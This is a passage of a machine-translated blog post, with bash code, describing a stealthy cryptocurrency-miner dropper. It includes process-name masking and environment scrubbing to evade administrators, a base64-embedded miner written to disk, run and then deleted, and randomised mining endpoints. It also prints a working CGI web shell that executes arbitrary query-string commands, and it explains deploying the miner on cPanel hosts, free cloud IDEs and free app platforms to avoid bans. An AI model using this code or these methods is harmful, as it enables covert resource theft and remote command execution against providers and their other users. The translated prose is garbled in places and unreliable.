    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>この関数はに依存しています<a href=https://ipinfo.io/> ipinfo</a> ワーカーの領域を決定します。これにより、領域に依存するロジックを調整できます。<a href=\assets/posts/geoip.json> geoip.json</a> トップレベルの地域が必要であり、特定の国には関心がないため、国を地域にグループ化します。<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bashは、抽象化することにより、tcp接続をサポートしています。<code>/dev/tcp</code> （udpの場合も同様ですが、ほとんどの場合、ビルド時に無効になっているようですので、信頼することはできません）。これらのファイルはbashのものであり、Linuxの一部ではありません<code>/dev</code> 木。<p>bashジョブ間の同時実行を処理するためのロックシステムについても言及する価値があります。複数のジョブがロックを処理できるようにするには、すべてのジョブがファイル記述子を共有する必要があるため、<code>locker</code> これもジョブであり、ロックを使用する他のジョブの前に開始する必要があります。ロッカーは単に読みます<code>stdin</code> ロック要求を待って、応答します<code>stdout</code> 変数に格納されている現在のブール状態によって異なります。このアプローチがレースフリーであることを保証するものではありませんが、適切に機能しているようです。一方、ファイル記述子は信頼性が低いことがわかりました。バッファの一部がフラッシュされない可能性があるためです。<em> パイプ</em> そして最終的にはデッドロックに陥ります（つまり、常に答えを与えるロッカーに頼ることはできません）。<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>ガベージをクリーンアップします...複雑なbashプログラムは多くの変数を使用することになり、グローバルスペースを悪用すると肥大化します。シェルジョブを生成している場合、それらはすべての環境を継承します（効果的に複製され、共有されません）、すぐにバッシュを食べることになります<code>100M</code> 記憶の、良くない。また、私たちは本当に目立たないようになりたいです。私たちの展開シナリオでは、敵は<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> ルートアクセスとプロセスに関する完全な情報を持つ可能性があります<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> 、そしてご存知のとおり...すべてのプロセスは、それを開始した完全なコマンドと、エクスポートされた環境変数に関する情報を保持しています。<h2 id=configuration><a class=header-anchor href=#configuration> 構成</a></h2><p>環境とツールを取得したら、マイナーを実行しているマシンに合わせて調整し、疑似コードで構成手順を実行する必要があります。<ul><li><p>マイナーのプロセス名<li><p>ホスト情報（ram / cores / caches /<code>ENV_VARS</code>)<li><p>構成バージョン<li><p><code>worker_id</code> マイナー用（IPおよびホストから）<li><p>接続用のIP /ポート</ul><p>プロセスの名前を選択するには、<em> 隠れる</em> マイナーを実行しているという事実ですが、バイナリの名前を変更するだけでなく、次のリストがあります。<strong> マスク</strong> 潜在的な候補者の場合（各行がマスクであるプレーンテキストファイル）：<ul><li><p>ランダムにマスクを選ぶ<li><p>文字列の末尾の要素（最初の要素を除くすべて）をシャッフルして、さまざまなプロセスコマンドを取得します。これで、次のような文字列が作成されました。<code>cmd --arg2 --arg1 --arg3</code> 。これはマイナーマスクです。バイナリを実行します<em> それなし</em> 引数ですが、コマンドを開始したようです<code>cmd</code> 引数付き<code>--arg1 --arg2 --arg3</code> 。ファイル名にはスペースとダッシュを使用できるため、このような名前のバイナリを実行することは問題ありません。Linuxは、プロセスコマンドを格納するときに実行可能ファイルと引数を区別しないようです。<p>マイナー構成はから自動的にロードされます<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> ハッシュレート</a></h3><p>、時間とともに、上流の鉱夫は多くを手に入れました<strong> 自動チューニング</strong> 機能があるため、スクリプトの一部が冗長になりましたが、ここでのアップストリームとダウンストリームの違いは、アップストリームの目標が最大化することであるということです。<em> パフォーマンス</em> 、私たちの目標は最大化することですが<em> 効率と難読化</em> 、私たちはシステムを追い越したくありません、私たちはサービスを中断することなく少しリーチしたいです。<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>このためには、環境をより詳細に理解する必要があります。<code>l2/l3</code> プロセッサ、RAM、コア、および現在のプロセッサのキャッシュ構造<em> 平均</em> 負荷とCPU<em> 利用方法</em>。私は構築しようとしました<a href=https://en.wikipedia.org/wiki/Finite-state_machine> ステートマシン</a> 最低限から始めて、平均してゆっくりと落ち着くさまざまな構成を試すbashで。そうでした<strong> 巨大な</strong> 散らかった努力の無駄<a href=https://en.wikipedia.org/wiki/Technical_debt> 技術的負債</a> それは非常に迅速に破産し、ほとんどが破棄され、コードベースに残っているのは残りだけでした。<p>この自動調整ジャンボをすべて実行します。ホストの使用状況/負荷に応じてマイナーをスリープ状態にしました。これには、マイナーの変更が必要です。<code>sleep</code> スレッド間の歩留まり、および構成ウォッチドッグへのいくつかの修正<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> 、これにより、実行時にスリープ量をリロードできます。ロジックははるかに単純化されており、次のようになります。<ul><li><p>使用量が$ TARGET_USAGE（±許容誤差）より上/下の場合スリープを増減します<li><p>内の平均負荷の場合<code>1m</code> $ TARGET_LOADの一時停止/再開マイニングの上/下</ul><h3 id=connection><a class=header-anchor href=#connection> 繋がり</a></h3><p>bashのまとめでは、接続用のユーティリティを示しました。なぜこれらが必要なのですか？多様性が必要だからです。エンドポイントを構成にハードコーディングするだけでは長続きしません。疑わしいものがあり、ネットワークアクティビティがある場合、IPにフラグが付けられます。<p>最初に、いくつかの方法を試しました。<ul><li><p>を使用して<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> プロキシチェーン</a> マイナーネットワーク呼び出しを過負荷にするために、しかしそれはマイナーが動的ライブラリで構築されることを必要とし、そしてあなたはそれらをペイロードと共に出荷しなければならなかったので、それは非現実的でした。<li><p>実行中<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> フォワードトンネル</a> マイナーと並べて：これには多くの構成オーバーヘッドがありました。これは、各デプロイメントで2つのプロセスを構成していたため、バグが増えたためです。</ul><p>最後に、bash変数に格納されたエンドポイントのリストを出荷し、ランダムに1つを選択することにしました。もちろん、接続は暗号化されていました。これらのエンドポイントは何ですか？マイナージョブを処理するプロキシへのフォワーダー。<p>なぜ必要なのですか<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> マイニングプロキシ</a> ？私は実際に最大100の同時接続を超えたことはなかったので、ネットワークの負荷にプロキシは実際には必要ありませんでしたが、ハッシュアルゴリズムをネゴシエートし、さまざまな難易度ターゲットをさまざまなマイナーに提供して、マイナーが作業できないようにするのに便利でした<strong> 困難</strong> 完了するのに時間がかかりすぎて、未完了のジョブで計算を無駄にするリスクを回避するターゲット。<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> プールソフトウェアは、プレーンなhttpリクエストのプロキシになることを喜んで宣伝していたため、いくつかの変更も必要でした...<em> タイムアウトする必要がありました</em> 、およびフォークがアクセス制御を追加したので、それに基づいてmodを作成しました。<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> jsonの編集</a></h3><p>いくつかのenvvar置換といくつかの正規表現を使用して、bashだけでjsonファイルに変更を適用します。当初、私たちは<code>envsubst</code> 変数を適用するためのバイナリ、それから私たちは完全なbashに行きました<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> このロジックで：<ul><li><p>構成テンプレートを読む<li><p>すべての引用符を非常に難解な文字列に置き換えます（<code>_#_#</code>)<li><p><code>eval</code> テンプレート<li><p>すべての難解な出来事を引用符で置き換えます</ul><p>サブプロセスを回避することとは別に、別の利点は、テンプレートで完全なbash機能を取得できることです。テンプレートなしで読み書きするには、bash正規表現機能に依存する必要があります。<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>これにより、単一行の編集のみが可能になります。複数行のエントリの場合、最初の行のみが考慮されます。ただし、ユースケースには十分です。<h2 id=runtime><a class=header-anchor href=#runtime> ランタイム</a></h2><p>ランタイムはどのように見えますか？メインループを実行するメインbashプロセスがあり、次にマイナーサブプロセス、CPUモニターサブプロセス、ロッカー、チューナーがあります。それはほとんど一握りです。<p>まず、問題が発生した場合に混乱を残さないようにします。これは、bashトラップを使用して終了時にクリーンアップを実行することを意味します。<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> 再帰を防ぐためにトラップの設定を解除します。トラップはすべてのジョブを強制終了し、作業環境を削除します。<p>base64エンコーディングでbash変数として格納されているマイナーを開始するときが来ました。それをファイルシステムにダンプしてから、構成をダンプし、マイナーを実行して、マイナーと構成の両方を削除します。 Linuxでは、実行中のプロセスの実行可能ファイルを削除できます（Windowsではこれは許可されていません）。<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> マイナーが実行されているとき、ファイルシステムには<code>.. /</code> のあるディレクトリ<code>b64</code> その中のリンク。<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>マイナーのエンコード中にbashで発生する厄介な癖は、変数に引用符付きのサブシェルを割り当てることです。<code>myvar="$(something)"</code> メモリ使用量が永続的に増加します。これはデバッグが難しく、このように動作する理由が実際には見つかりませんでした。とにかく、割り当てを引用符で囲む必要があります。代わりにデコードはで行われます<em> herestrings</em> これは一時ファイルの抽象化であり、変数はファイルにダンプされ、プロセスにパイプで戻されます。<p>マイナーの長時間実行ループ：<ul><li><p>本当ながら<ul><li><p>鉱夫を止めろ<li><p>構成を削除します<li><p>マイナーを開始<li><p>本当ながら<ul><li><p>デーモンを開始します<ul><li><p>鉱夫が走っている間<ul><li><p>鉱夫からの出力を読む<li><p>出力行に基づいてマイナーアクションを選択します</ul></ul><li><p>マイナーが実行されていない場合：break</ul><li><p>寝る</ul></ul><p>出力行は、いくつかの正規表現と照合されます。<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>デーモンは次の場合を処理します<ul><li><p>エンドポイントへの接続でエラーが発生します（新しいランダムエンドポイントを選択してください）<li><p>ハッシュアルゴリズムの変更（スリープ時間とアドホック構成の調整）<li><p>マイナーの問題（マイナーを再起動します）。</ul><p>しばらくの間、手動の再起動をトリガーできるコマンドアンドコントロールダッシュボードがサポートされていましたが、使用量が最小限であったため破棄され、エンドポイントが代替プール接続に置き換えられたため、再起動プロセスも不安定で複雑でした。 ..技術的負債の別の例。しかし、更新されたペイロードを再フェッチし、すべての構成をその場で再セットアップすることができました。これは非常にクールで、究極のトランポリンでした。<h2 id=debugging><a class=header-anchor href=#debugging> デバッグ</a></h2><p>3つの主要なユーティリティがあります<ul><li><p>コードブロック周辺のトレースを有効/無効にします（変数内のb64でエンコードされたバイナリをトレースしたくありません。）<li><p>ログをフォーマットするためのシンプルな関数<li><p>マイナーが開始されるたびに実行時に詳細ログをアクティブにするフラグ。<ul><li><p>ファイルを実行します<code>.debug</code> 存在？<ul><li><p>詳細なロギングを有効にする</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> ターゲット展開</a></h2><p>このセットアップは、次の3種類のホストでテストされています。<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> セルフホストコンテナまたはVM</a></h3><p>多くのホスティングプロバイダーは、CPUリソースが複数のユーザー間で共有される傾向があるため、マイニングを好みません。マイニングソフトウェアは、ホストノードの速度を簡単に低下させ、残りのユーザーのパフォーマンスに影響を与える可能性があります。これは、CPUユーザーの時間が無制限であっても当てはまります。これは、キャッシュがすべてのCPUコア間で共有されている場合、ハッシュアルゴリズムがCPUのすべてのキャッシングレイヤーを飽和させる可能性があるためです。<p>使用したい<em> 公平</em> 禁止されることなくリソースを共有します。これは、ホストの使用状況を認識しているため、ステルスドロッパーの優れたユースケースです。<em> したほうがいい</em> [AUP]の範囲内にとどまります。セルフホスト展開を処理する場合、追加の手順はありません。起動シーケンスに追加するか、手動で起動するランチャースクリプトのみを処理します。<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanelベースのウェブホスティング</a></h3><p>ウェブホスティングサブスクリプションプランは、主に[cPanel]を通じて提供されます。ここでも、妥当なリソース制限がある個人サブスクリプションプランを使用していますが、無料プランにはばかげた制限があります<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> 。 cPanelを使用すると、さまざまなファイル拡張子のハンドラーを定義できます。これにより、シェルスクリプトを実行できます。<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> サーバーにアップロードされたシェルスクリプトに対するhttpリクエストを使用します。これらの種類のインターフェースは、Webシェルがどのように見えるかです。<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> 。シンプルなbashWebシェル<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Web刑務所では追加のプロセスをフォークすることは許可されていない可能性があるため、ビルトインのみに依存することをお勧めしますが、いつでも可能です。<code>exec</code> これにより、ほとんどのコマンドラインユーティリティを使用できます。ほとんどのWebシェルは、フォークについて心配する必要がないため、pythonやphpなどの他のスクリプト言語で記述されています。<p>cpanel環境では、マイナープロセスに静的な名前を使用することをお勧めします。<code>httpd</code> また<code>php-fpm</code> なぜなら<code>cgi</code> はマルチプロセッシングに基づいているため、サーバーは常にこのような名前の多くのプロセスで満たされていますが、注意深い観察者は<em> マルチスレッド</em> perl、php、ruby、pythonなどの言語では絶対に一般的ではない（または不可能な）使用パターン！<p>プロセスにはデフォルトで時間制限（1時間、1日など）もあります。このために、ドロッパーを再起動するcronジョブを使用します。<p>これには多くの手動編集が必要でした。これを自動化するcpanelapiは残念ながらエンドユーザーに公開されていないため、Webホスティングはマイナードロッパーにとって不格好で退屈なターゲットです。<h3 id=web_environments><a class=header-anchor href=#web_environments> Web環境</a></h3><p>がある<em> SaaS</em> 次のようなコンテナと結合されたWebエディタを持っているプロバイダー<a href="with a free tier before getting acquired by amazon"> クラウド9</a> 、[codeanywhere]、[codenvy]。ここにドロッパーをデプロイするのは簡単です（本格的な環境があります）が、インタラクティブなWebエディターは、Webページが閉じられた直後にセッションを終了し、その結果、コンテナーがスリープ状態になるため、実行を維持するのは負担になります（もちろん支払う）。<p>これを回避するということは、セッションを開いたままにしておく必要があることを意味するだけです。[puppeteer]を使用した一部のスクリプトは目的の結果を達成しましたが、プロバイダーのバックエンドから、 24時間年中無休で開かれるセッションは間違いなく疑わしいように見えます。確かに、Web環境も不格好で退屈なターゲットです。<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> 無料アプリサービス</a></h3><p>これは主に<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> および[heroku]。 Openshiftは、kubernetesであるため、デプロイするのはやや簡単でしたが、構成のチャーンがいっぱいで、以下に抜粋を示します。<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

